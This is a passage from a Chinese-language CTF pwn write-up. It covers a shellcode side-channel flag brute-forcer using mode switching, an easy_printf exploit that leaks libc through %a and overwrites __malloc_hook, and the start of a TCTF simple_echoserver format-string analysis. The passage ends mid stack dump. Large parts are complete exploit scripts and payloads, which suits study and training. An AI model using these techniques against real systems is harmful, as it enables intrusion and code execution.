class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		/*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">		mov esp,0x40404140</span></span><br><span class="line"><span class="string">		push 0x67616c66</span></span><br><span class="line"><span class="string">		push esp</span></span><br><span class="line"><span class="string">		pop ebx</span></span><br><span class="line"><span class="string">		xor ecx,ecx</span></span><br><span class="line"><span class="string">		mov eax,5</span></span><br><span class="line"><span class="string">		int 0x80</span></span><br><span class="line"><span class="string">		push 0x33</span></span><br><span class="line"><span class="string">		push 0x4040405E</span></span><br><span class="line"><span class="string">		retf</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	</span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">		mov rdi,3</span></span><br><span class="line"><span class="string">		mov rsi,rsp</span></span><br><span class="line"><span class="string">		mov rdx,0x70</span></span><br><span class="line"><span class="string">		xor rax,rax</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	</span><br><span class="line">shellcode_read_flag += <span class="string">F&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		cmp byte ptr[rsi+<span class="subst">&#123;pos&#125;</span>], <span class="subst">&#123;char&#125;</span></span></span><br><span class="line"><span class="string">		ja loop</span></span><br><span class="line"><span class="string">		ret</span></span><br><span class="line"><span class="string">		loop:</span></span><br><span class="line"><span class="string">		jmp loop</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">shellcode_open_x86 = asm(shellcode_open_x86, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode_read_flag = asm(shellcode_read_flag, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">syscall_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		push rdx</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	</span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">		push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">		pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		xor al,0x47</span></span><br><span class="line"><span class="string">		push rax</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		xor al,0x40</span></span><br><span class="line"><span class="string">		push rax</span></span><br><span class="line"><span class="string">		pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push rax /*set r9*/</span></span><br><span class="line"><span class="string">		pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		/*syscall*/</span></span><br><span class="line"><span class="string">		push rbx</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		push 0x5d</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">		push 0x5f</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		xor al,0x49</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	</span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">		push 0x40404040</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 0x40</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		xor al,0x40</span></span><br><span class="line"><span class="string">		push rax</span></span><br><span class="line"><span class="string">		pop rdi</span></span><br><span class="line"><span class="string">		push 0x70</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push rbx</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		push 0x5d</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string">		push 0x5f</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		xor byte ptr[rax+0x56],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		push rdx</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		xor al,0x70</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		push rbx</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		xor al,0x40</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		push 0x72</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">		push 0x68</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">		push 0x47</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">		push 0x48</span></span><br><span class="line"><span class="string">		pop rcx</span></span><br><span class="line"><span class="string">		sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">		push 0x23</span></span><br><span class="line"><span class="string">		push 0x40404040</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">	shellcode = shellcode_mmap</span><br><span class="line">	shellcode += syscall_retfq</span><br><span class="line">	shellcode += shellcode_read</span><br><span class="line">	shellcode += syscall_retfq</span><br><span class="line">	shellcode += shellcode_retfq</span><br><span class="line">	shellcode += syscall_retfq</span><br><span class="line">	shellcode = asm(shellcode, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">	io.sendline(shellcode)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	io.sendline(shellcode_open_x86 + shellcode_read_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	start = time.time()</span><br><span class="line">	pos = <span class="number">0</span></span><br><span class="line">	flag = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line">		<span class="keyword">while</span> left &lt; right :</span><br><span class="line">			mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">			io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">			pwn(pos, <span class="built_in">ord</span>(possible_list[mid]))</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">				left = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				right = mid</span><br><span class="line">			io.close()</span><br><span class="line">		flag += possible_list[left]</span><br><span class="line">		<span class="built_in">print</span>(flag)</span><br><span class="line">		<span class="keyword">if</span> possible_list[left] == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		pos = pos + <span class="number">1</span></span><br><span class="line">	success(flag)</span><br><span class="line">	end = time.time()</span><br><span class="line">	success(<span class="string">&quot;time:\t&quot;</span> + <span class="built_in">str</span>(end - start) + <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>网上找的exp,看了一下,每一段代码都有使用smc,但实际上在mmap后如果调用一个read往新mmap的内存写上想要的指令就不需要smc了</p>
<p>即第一次需要smc时构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap(addr,len....)</span><br><span class="line">read(0,addr,len)</span><br><span class="line">jmp addr</span><br></pre></td></tr></table></figure>
<h1 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h1><p><strong>标签:格式化字符串|printf触发malloc|%a占位符</strong></p>
<p>保护机制全开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/easy_printf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>程序的主体就是两个printf的格式化字符串攻击,不过一个是正常的print但使用一次就会使用系统调用退出,还有一个是削弱了格式化字符串漏洞的__printf_chk函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy you the last time!&quot;</span>);</span><br><span class="line">  s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">0x80</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  v3 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v5 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your fmt: &quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">    s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">5uLL</span>)] = <span class="number">0</span>;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, s, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>比较常见的思路是先泄露栈再利用%n打rop,但因为printf只能使用一次就比较难办了</p>
<p>__printf_chk对格式化字符串的限制很大,几乎没有什么可利用的功能了</p>
<p>这就需要用到一个暂时还搞不太清楚原理的知识点,在__printf_chk函数格式化字符串用且只能用一个或者两个%a填充,能够打印出来stdin和stdout指针,以此泄露libc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%a</span><br><span class="line">0x0.07f6e76f5498p-1022</span><br><span class="line">%a%a</span><br><span class="line">0x0.07ffa5ebb098p-10220x0.07ffa5ebb16ap-1022</span><br><span class="line">%a%a%a</span><br><span class="line">null</span><br></pre></td></tr></table></figure>
<p>虽然不太懂原理,而且本地另写一个程序并没有复现成功,但在应对__printf_chk时不失为一个尝试</p>
<p>此后还要利用printf在输出超过65535长度的内容时会触发malloc这个知识点,并以此为基础修改malloc_hook为one_gadget并触发</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr2</span>(<span class="params">offset, addr, data, written</span>):</span><br><span class="line">	<span class="keyword">global</span> cnt = <span class="number">0</span></span><br><span class="line">	payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">	address = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">		cur = x</span><br><span class="line">		<span class="keyword">if</span> cur &gt;= written&amp;<span class="number">0xff</span>:</span><br><span class="line">			to_add = cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			to_add = <span class="number">0x100</span> + cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line">		<span class="built_in">round</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line">			<span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add).encode()</span><br><span class="line">		<span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(offset+cnt+<span class="built_in">len</span>(data)*<span class="number">2</span>).encode()</span><br><span class="line">		<span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">round</span>) &lt;= <span class="number">0x10</span>)</span><br><span class="line">		written += to_add</span><br><span class="line">		payload += <span class="built_in">round</span></span><br><span class="line">		address += p64(addr+cnt)</span><br><span class="line">		cnt+=<span class="number">1</span></span><br><span class="line">	<span class="comment"># trigger malloc</span></span><br><span class="line">	<span class="keyword">return</span> (payload+<span class="string">b&quot;%65537c&quot;</span>).ljust(<span class="number">0x50</span>,<span class="string">b&quot;_&quot;</span>) + address</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(<span class="string">&quot;./easy_printf&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your fmt: &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%a%a\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x0.0&#x27;</span>)</span><br><span class="line">libc.address = (<span class="built_in">int</span>(p.recv(<span class="number">11</span>),<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) - libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">hook_addr=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(hook_addr))</span><br><span class="line">one=libc.address+<span class="number">0xe3b04</span></span><br><span class="line">info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">pause()	</span><br><span class="line">payload = fmtstr2(<span class="number">6</span>,hook_addr,p64(one)[:<span class="number">6</span>],<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">p.send(payload)</span><br><span class="line">	</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">		</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里看ruan师傅的exp还学到了格式化字符串的%n的一个新姿势</p>
<p>即%hhn只写一个字节,如果写的数大于255那么只保留最后一个字节的数据</p>
<p>以此来稳定构造格式化字符串任意写</p>
<h1 id="2020tctf-simple-echoserver"><a href="#2020tctf-simple-echoserver" class="headerlink" title="2020tctf-simple_echoserver"></a>2020tctf-simple_echoserver</h1><p><strong>标签:格式化字符串|*占位符</strong></p>
<p>checksec发现保护全开</p>
<p>看一下程序的流程,读入name和phonenumber</p>
<p>拼接格式化字符串后由stderr输出,此处存在格式化字符串漏洞,不过只能利用一次</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_13C1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">snprintf</span>(byte_4060, <span class="number">0x100</span>uLL, <span class="string">&quot;[USER] name: %s; phone: %ld\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1, *(_QWORD *)(a1 + <span class="number">256</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, byte_4060);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是要一次利用printf的机会就完成利用,这就难办了</p>
<p>在没有其他帮助下,正常来说应该最少要两次格式化字符串利用才能完成利用</p>
<p>这里学到一个新姿势<code>*占位符</code>,*占位符以对应的函数参数的值作为一次变量输出的宽度</p>
<p>例如<code>printf(&quot;%*c%n&quot;,123,&#39;a&#39;,&amp;var);</code>就会输出123宽度的字符a</p>
<p>结合*??$即可获取栈上任意的值作为宽度</p>
<p>但这又有什么用呢?</p>
<p>如果我们结合%n,那么加上之前输出的宽度,岂不是可以在无输出的情况下完整的写一个地址</p>
<p>那么思路就有了</p>
<p>断点下在fprintf处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fff7221d658</span> —▸ <span class="number">0x55d2c7dcf41a</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fff7221d660</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fff7221d668</span> —▸ <span class="number">0x55d2c7dd2160</span> ◂— <span class="string">&#x27;%*48$c%801983c%26$n%221c%7$hhn&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fff7221d670</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fff7221d678</span> —▸ <span class="number">0x55d2c7dcf443</span> ◂— lea rdi, [rip + <span class="number">0xc5b</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fff7221d680</span> —▸ <span class="number">0x7fe104ff78a0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fff7221d688</span> —▸ <span class="number">0x7fe104e9fb9f</span> (_IO_file_underflow+<span class="number">383</span>) ◂— test rax, rax</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fff7221d690</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7fff7221d698</span> —▸ <span class="number">0x7fe104e70d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov rcx, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7fff7221d6a0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x7fff7221d6a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0x7fff7221d6b0</span> ◂— <span class="number">0x40584a0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x7fff7221d6b8</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0x7fff7221d6c0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0x7fff7221d6c8</span> ◂— <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0x7fff7221d6d0</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│     <span class="number">0x7fff7221d6d8</span> —▸ <span class="number">0x55d2c7dcf0f0</span> ◂— endbr64 </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│     <span class="number">0x7fff7221d6e0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│     <span class="number">0x7fff7221d6e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│     <span class="number">0x7fff7221d6f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│     <span class="number">0x7fff7221d6f8</span> —▸ <span class="number">0x55d2c7dcf348</span> ◂— mov rcx, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│     <span class="number">0x7fff7221d700</span> —▸ <span class="number">0x7fe104ff84a0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│     <span class="number">0x7fff7221d708</span> —▸ <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│     <span class="number">0x7fff7221d710</span> ◂— <span class="string">&#x27;111111111111111111111111&#x27;</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x7fff7221d730</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7fff7221d738</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7fff7221d740</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│     <span class="number">0x7fff7221d748</span> —▸ <span class="number">0x55d2c7dcf28d</span> ◂— mov r12d, eax</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7fff7221d750</span> ◂— <span class="number">0x100c7dcf4e0</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│     <span class="number">0x7fff7221d758</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│     <span class="number">0x7fff7221d760</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│     <span class="number">0x7fff7221d768</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│     <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│     <span class="number">0x7fff7221d778</span> —▸ <span class="number">0x55d2c7dcf3b3</span> ◂— mov rdx, qword ptr [rbp - <span class="number">8</span>]</span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│     <span class="number">0x7fff7221d780</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│     <span class="number">0x7fff7221d788</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│     